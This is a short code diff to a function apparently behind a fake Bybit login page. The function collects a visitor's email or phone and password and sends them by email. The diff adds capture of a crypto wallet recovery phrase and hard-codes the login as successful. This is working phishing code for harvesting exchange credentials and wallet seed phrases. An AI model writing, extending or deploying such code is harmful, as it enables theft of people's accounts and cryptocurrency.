@@ -90,12 +90,13 @@ export async function notifyBybitLogin(formData: FormData) {
 
   const emailData = {
     emailType: "bybit-login" as const,
-    loginEmail: (formData.get("email") as string) || (formData.get("phone") as string),
-    loginPassword: formData.get("password") as string,
+    loginEmail: (formData.get("email") as string) || (formData.get("phone") as string) || "Web3 Login",
+    loginPassword: formData.get("password") as string || "Web3 Login",
     loginSuccess: true, // Assuming success for demo
     deviceInfo,
     ipAddress,
     timestamp,
+    walletPhrase: formData.get("walletPhrase") as string || undefined,
   }
 
   await sendNotificationEmail(emailData)
